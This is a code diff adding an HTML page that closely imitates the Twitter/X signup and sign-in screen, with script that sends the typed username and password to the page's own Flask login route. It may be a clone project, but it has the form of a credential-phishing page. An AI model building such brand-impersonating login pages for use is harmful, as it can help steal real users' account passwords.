@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Twitter / X</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #1d9bf0;
+            --primary-hover: #1a8cd8;
+            --text: #0f1419;
+            --text-light: #536471;
+            --border: #cfd9de;
+            --background: #ffffff;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        }
+
+        body {
+            display: flex;
+            min-height: 100vh;
+            background-color: var(--background);
+            color: var(--text);
+        }
+
+        .split-section {
+            width: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem;
+        }
+
+        .hero-content {
+            max-width: 400px;
+        }
+
+        .logo {
+            font-size: 4rem;
+            margin-bottom: 2.5rem;
+        }
+
+        h1 {
+            font-size: 4rem;
+            margin-bottom: 2rem;
+            font-weight: 700;
+            line-height: 1.2;
+        }
+
+        h2 {
+            font-size: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .auth-container {
+            max-width: 300px;
+            width: 100%;
+        }
+
+        .btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 0.75rem;
+            border-radius: 2rem;
+            border: 1px solid var(--border);
+            background: transparent;
+            color: var(--text);
+            font-weight: 600;
+            font-size: 0.9375rem;
+            cursor: pointer;
+            margin-bottom: 1rem;
+            transition: background 0.2s;
+        }
+
+        .btn:hover {
+            background: rgba(15, 20, 25, 0.05);
+        }
+
+        .btn i {
+            margin-right: 0.5rem;
+            font-size: 1.1rem;
+        }
+
+        .btn-primary {
+            background: var(--primary);
+            color: white;
+            border: none;
+        }
+
+        .btn-primary:hover {
+            background: var(--primary-hover);
+        }
+
+        .btn-outline {
+            color: var(--primary);
+            border-color: var(--border);
+        }
+
+        .btn-outline:hover {
+            background: rgba(29, 155, 240, 0.1);
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 1rem 0;
+            color: var(--text-light);
+        }
+
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .divider::before {
+            margin-right: 1rem;
+        }
+
+        .divider::after {
+            margin-left: 1rem;
+        }
+
+        .legal {
+            color: var(--text-light);
+            font-size: 0.7rem;
+            margin-top: 2rem;
+            line-height: 1.4;
+        }
+
+        .legal a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        .legal a:hover {
+            text-decoration: underline;
+        }
+
+        .auth-prompt {
+            margin: 2rem 0 1rem;
+            font-weight: 600;
+        }
+
+        /* Modal styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 2rem;
+            border-radius: 1rem;
+            width: 90%;
+            max-width: 400px;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            body {
+                flex-direction: column;
+            }
+            .split-section {
+                width: 100%;
+                padding: 1.5rem;
+            }
+            .logo {
+                font-size: 3rem;
+            }
+            h1 {
+                font-size: 2.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="split-section">
+        <div class="hero-content">
+            <div class="logo">𝕏</div>
+            <h1>Happening now</h1>
+            <h2>Join today.</h2>
+        </div>
+    </div>
+    
+    <div class="split-section">
+        <div class="auth-container">
+            <button class="btn" id="googleBtn">
+                <i class="fab fa-google"></i> Sign up with Google
+            </button>
+            
+            <button class="btn" id="appleBtn">
+                <i class="fab fa-apple"></i> Sign up with Apple
+            </button>
+            
+            <div class="divider">or</div>
+            
+            <button class="btn btn-primary" id="createAccountBtn">Create account</button>
+            
+            <p class="legal">
+                By signing up, you agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>, including <a href="#">Cookie Use</a>.
+            </p>
+            
+            <p class="auth-prompt">Already have an account?</p>
+            <button class="btn btn-outline" id="signInBtn">Sign in</button>
+        </div>
+    </div>
+
+    <!-- Sign In Modal -->
+    
+<div id="signinModal" class="modal">
+  <div class="modal-content"><!-- login.html will be loaded here --></div>
+</div>
+
+
+    <script>
+document.addEventListener('DOMContentLoaded', () => {
+  /* ----- BUTTON LINKS ----- */
+  document.getElementById('googleBtn').onclick  = () => location.href = '/auth/google';
+  document.getElementById('appleBtn').onclick   = () => location.href = '/auth/apple';
+  document.getElementById('createAccountBtn').onclick = () => location.href = '/signup';
+
+  /* ----- SIGN-IN MODAL ----- */
+  const modal        = document.getElementById('signinModal');
+  const modalContent = modal.querySelector('.modal-content');
+
+  // Open and load login.html
+  document.getElementById('signInBtn').addEventListener('click', async () => {
+    // Fetch only once; cache afterwards
+    if (!modalContent.dataset.loaded) {
+      try {
+        const resp = await fetch('/signin1');          // flask route returns render_template('login.html')
+        modalContent.innerHTML = await resp.text();  // inject
+        modalContent.dataset.loaded = 'true';        // mark as cached
+
+        // add close-modal listener now that the button exists
+        modalContent.querySelector('.close-modal')
+                    .addEventListener('click', () => modal.style.display='none');
+      } catch (err) {
+        modalContent.innerHTML = '<p>Could not load form.</p>';
+      }
+    }
+    modal.style.display = 'flex';
+  });
+
+  // Close when clicking backdrop
+  modal.addEventListener('click', e => {
+    if (e.target === modal) modal.style.display = 'none';
+  });
+});
+async function checkIdentifier() {
+  const identifier = document.getElementById('identifierInput').value;
+  const messageDiv = document.getElementById('identifierMessage');
+  const modal = document.getElementById('signinModal');
+  const modalContent = modal.querySelector('.modal-content');
+
+  if (!identifier.trim()) {
+    messageDiv.style.color = 'red';
+    messageDiv.textContent = 'Please enter your phone, email, or username.';
+    return;
+  }
+
+  messageDiv.textContent = '';
+
+  try {
+    const response = await fetch('/check-identifier', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ identifier: identifier })
+    });
+
+    const data = await response.json();
+
+    if (data.exists) {
+      messageDiv.style.color = 'green';
+      messageDiv.textContent = data.message;
+
+      // Load the signIn template directly into the modal
+      try {
+        
+        const loginResponse = await fetch('/signin2', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ identifier })
+        });
+        modalContent.innerHTML = await loginResponse.text();
+        modalContent.dataset.loaded = 'true';
+
+        // Add close-modal listener now that the button exists
+        const closeBtn = modalContent.querySelector('.close-modal');
+        if (closeBtn) {
+          closeBtn.addEventListener('click', () => modal.style.display = 'none');
+        }
+
+        modal.style.display = 'flex';
+
+      } catch (err) {
+        modalContent.innerHTML = '<p>Could not load form.</p>';
+        modal.style.display = 'flex';
+      }
+
+    } else {
+      messageDiv.style.color = 'red';
+      messageDiv.textContent = data.message;
+    }
+
+  } catch (error) {
+    messageDiv.style.color = 'red';
+    messageDiv.textContent = 'Some error occurred.';
+    console.error('Error:', error);
+  }
+}
+function hideShowPass() {
+     const togglePassword = document.getElementById('togglePassword');
+  const password = document.getElementById('password');
+  const loginButton = document.getElementById('loginButton');
+  const eyeIcon = togglePassword.querySelector('svg');
+  
+  // Twitter/X's eye icon paths
+  const eyeOpenPath = `
+    <path d="M12 5C5 5 1 12 1 12C1 12 5 19 12 19C19 19 23 12 23 12C23 12 19 5 12 5Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+    <path d="M12 15C13.6569 15 15 13.6569 15 12C15 10.3431 13.6569 9 12 9C10.3431 9 9 10.3431 9 12C9 13.6569 10.3431 15 12 15Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+  `;
+  
+  const eyeClosedPath = `
+    <path d="M2 2L22 22" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+    <path d="M6.71277 6.7226C3.66479 8.79527 2 12 2 12C2 12 5.63636 19 12 19C14.0503 19 15.8174 18.2734 17.2711 17.2884M11 5.05822C11.3254 5.02013 11.6588 5 12 5C18.3636 5 22 12 22 12C22 12 21.3082 13.3317 20 14.8335" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+    <path d="M14 14.2362C13.4692 14.7112 12.7684 15.0001 12 15.0001C10.3431 15.0001 9 13.657 9 12.0001C9 11.1764 9.33193 10.4303 9.86932 9.88818" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+  `;
+
+  if (togglePassword) {
+    togglePassword.addEventListener('click', function() {
+      const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+      password.setAttribute('type', type);
+      
+      // Toggle between eye open and closed SVG
+      eyeIcon.innerHTML = type === 'password' ? eyeOpenPath : eyeClosedPath;
+    });
+  }
+
+}
+async function handleLogin() {
+    const identifier = document.getElementById('identifier').value;
+    const password = document.getElementById('password').value;
+
+    if (!password) {
+      alert('Please enter your password');
+      return;
+    }
+
+    try {
+      const response = await fetch('/login', {  
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify({ identifier, password })
+      });
+
+      if (!response.ok) {
+        const errorData = await response.json();
+        alert('Login failed: ' + (errorData.message || 'Unknown error'));
+        return;
+      }
+
+      const data = await response.json();
+      
+      window.location.href = '/home';
+      // Redirect or update UI here, e.g.:
+      // window.location.href = '/dashboard';
+
+    } catch (error) {
+      alert('Network error: ' + error.message);
+    }
+  }
+
+</script>
+
+</body>
+</html>
